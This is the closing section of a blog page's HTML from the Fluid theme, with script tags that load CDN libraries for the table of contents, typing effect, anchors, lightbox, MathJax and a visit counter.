    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
